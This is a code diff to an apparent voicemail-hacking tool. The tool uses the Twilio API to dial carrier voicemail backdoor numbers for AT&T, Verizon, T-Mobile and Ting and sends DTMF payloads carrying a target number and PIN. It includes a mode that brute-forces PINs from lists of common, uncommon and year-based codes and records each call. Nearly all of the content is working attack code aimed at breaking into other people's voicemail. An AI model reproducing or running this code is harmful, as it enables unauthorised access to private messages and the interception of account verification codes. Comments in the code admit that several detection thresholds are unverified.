@@ -61,6 +61,7 @@ att_backdoors = ['2036407182', '2037228320', '2054759996', '2056134802', '205616
 att_home_backdoor = '8882888893'
 ting_backdoor = '8056377243'
 tmobile_backdoor = '8056377243'
+# 5153219200 call duration has been observed to be as high as 30, even if incorrect
 verizon_backdoors = ['5153219200', '5099939200', '4434656245', '3034899200', '2088669200']
 # https://www.verizon.com/support/alternate-international-voice-mail/
 # 8456138700 - Voicemail system for wireless?
@@ -131,9 +132,11 @@ def generate_all_verizon():
 
 
 def find_att_backdoor(each):
+    call_status = None
     call = client.calls.create(
         to=each,
         from_=args.callerid,
+        # This needs verified
         send_digits=f'ww{args.usernumber}w#',
         twiml=twiml_find_backdoor_payload,
         status_callback=status_callback_url,
@@ -145,6 +148,7 @@ def find_att_backdoor(each):
     call_ringing = False
     call_info = client.calls(call.sid).fetch()
     call_status = call_info.status
+    print(f'AT&T Backdoor Number: {each}')
     while call_status != 'completed':
         time.sleep(1)
         call_info = client.calls(call.sid).fetch()
@@ -169,16 +173,21 @@ def find_att_backdoor(each):
             .list(call_sid=call.sid, limit=1)
         recording_sid = [x.sid for x in recording][0]
         call_record_url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Recordings/{recording_sid}.wav"
-    if call_duration >= 15:
+    print(f'Call duration: {call_duration}')
+    print('-------------------------------')
+    # This seems right, but needs verified
+    if call_duration >= 25:
         return True, each
     else:
         return False, False
 
 
 def find_verizon_backdoor(each):
+    call_status = None
     call = client.calls.create(
         to=each,
         from_=args.callerid,
+        # This needs verified
         send_digits=f'ww{args.usernumber}w#',
         twiml=twiml_find_backdoor_payload,
         status_callback=status_callback_url,
@@ -190,6 +199,7 @@ def find_verizon_backdoor(each):
     call_ringing = False
     call_info = client.calls(call.sid).fetch()
     call_status = call_info.status
+    print(f'Verizon Backdoor Number: {each}')
     while call_status != 'completed':
         time.sleep(1)
         call_info = client.calls(call.sid).fetch()
@@ -214,7 +224,10 @@ def find_verizon_backdoor(each):
             .list(call_sid=call.sid, limit=1)
         recording_sid = [x.sid for x in recording][0]
         call_record_url = f"https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Recordings/{recording_sid}.wav"
-    if call_duration >= 20:
+    print(f'Call duration: {call_duration}')
+    print('-------------------------------')
+    # This ISN'T right, and can't be verified since I don't have a Verizon number
+    if call_duration >= 32:
         return True, each
     else:
         return False, False
@@ -227,15 +240,22 @@ def find_backdoor(args):
             found, backdoor = find_att_backdoor(each)
             if found:
                 break
+        if not found:
+            print('Your backdoor was not found')
+            sys.exit()
     elif args.carrier == 'ting':
         backdoor = ting_backdoor
     elif args.carrier == "tmobile":
         backdoor = tmobile_backdoor
     elif args.carrier == 'verizon':
+        print(verizon_backdoors)
         for each in verizon_backdoors:
             found, backdoor = find_verizon_backdoor(each)
             if found:
                 break
+        if not found:
+            print('Your backdoor was not found')
+            sys.exit()
     if backdoor:
         return backdoor
     else:
@@ -248,36 +268,55 @@ def retrieve_payload_message(args):
     if args.carrier == 'att':
         payload = '#ww' + args.usernumber + 'www' + args.pin
     elif args.carrier == 'ting':
-        payload = "*" + args.usernumber + "#" + args.pin + "#*ww1"
+        payload = "#"
     elif args.carrier == "tmobile":
-        payload = "*" + args.usernumber + "#" + args.pin + "#*ww1"
+        payload = "#"
     elif args.carrier == 'verizon':
         payload = '#' + args.usernumber + "#" + args.pin + "#*ww1"
-    if payload:
-        return payload
-    else:
-        print('Your payload is not implemented yet.')
-        sys.exit()
+    return payload
+#    if payload:
+#        return payload
+#    else:
+#        print('Your payload is not implemented yet.')
+#        sys.exit()
 
 
 def retrieve_payload_bruteforce(args, pins):
     payload = False
-    if len(pins) != 1:
-        if args.carrier == 'att':
-            payload = '#ww' + args.usernumber + 'www' + '#'.join(pins)
-        elif args.carrier == 'ting':
-            print('Needs to be implemented')
-        elif args.carrier == "tmobile":
-            print('Needs to be implemented')
-        elif args.carrier == 'verizon':
-            payload = '#www' + args.usernumber + 'www' + '#'.join(pins)
+    if type(pins) == list:
+        if len(pins) != 1:
+            if args.carrier == 'att':
+                the_pins = "#".join(pins)
+                payload = f"#ww{args.usernumber}www{the_pins}"
+            elif args.carrier == 'ting':
+                the_pins = "#".join(pins)
+                print(the_pins)
+                payload = f"#ww{args.usernumber}www{the_pins}"
+                print(payload)
+            elif args.carrier == "tmobile":
+                the_pins = "#".join(pins)
+                payload = f"#ww{args.usernumber}www{the_pins}"
+            elif args.carrier == 'verizon':
+                the_pins = "#".join(pins)
+                payload = f"#www{args.usernumber}www{the_pins}"
+        else:
+            if args.carrier == 'att':
+                payload = '#ww' + args.usernumber + 'www' + pins
+            elif args.carrier == 'ting':
+                payload = '#ww' + args.usernumber + 'www' + pins
+                print(f'payloaded: {payload}')
+            elif args.carrier == "tmobile":
+                payload = '#ww' + args.usernumber + 'www' + pins
+                print(f'payloaded: {payload}')
+            elif args.carrier == 'verizon':
+                payload = '#www' + args.usernumber + 'www' + pins
     else:
         if args.carrier == 'att':
             payload = '#ww' + args.usernumber + 'www' + pins
         elif args.carrier == 'ting':
-            print('Needs to be implemented')
+            payload = '#ww' + args.usernumber + 'www' + pins
         elif args.carrier == "tmobile":
-            print('Needs to be implemented')
+            payload = '#ww' + args.usernumber + 'www' + pins
         elif args.carrier == 'verizon':
             payload = '#www' + args.usernumber + 'www' + pins
     if payload:
@@ -369,6 +408,8 @@ def rock_and_roll(args, payload, backdoor):
             if not call_in_progress:
                 call_in_progress = True
                 print('The call is currently: IN PROGRESS')
+    print(f'Backdoor Number: {backdoor}')
+    print(f'Call duration: {call_info.duration}')
     if call_status == 'completed':
         call_duration = int(call_info.duration)
         recording = client.recordings \
@@ -397,7 +438,6 @@ def individual_pins(args):
     else:
         if args.top_4_pins:
             the_pins = the_pins + top_4_pins
-            print(the_pins)
         if args.uncommon_four_pins:
             the_pins = the_pins + uncommon_4_pins
         if args.year_pins:
@@ -510,9 +550,7 @@ def bruteforce(args):
     start = 0
     end = 3
     while not found:
-        print(pins_to_use)
         pins = pins_to_use[start:end]
-        print(pins)
         if pins != []:
             payload = retrieve_payload_bruteforce(args, pins)
             found, possible = rock_and_roll(args, payload, backdoor)
@@ -581,7 +619,6 @@ if __name__ == '__main__':
                                 help="Voicemail backdoor number")
 
     args = parser.parse_args()
-    print(args)
 
     if args.parser == 'bruteforce':
         bruteforce(args)
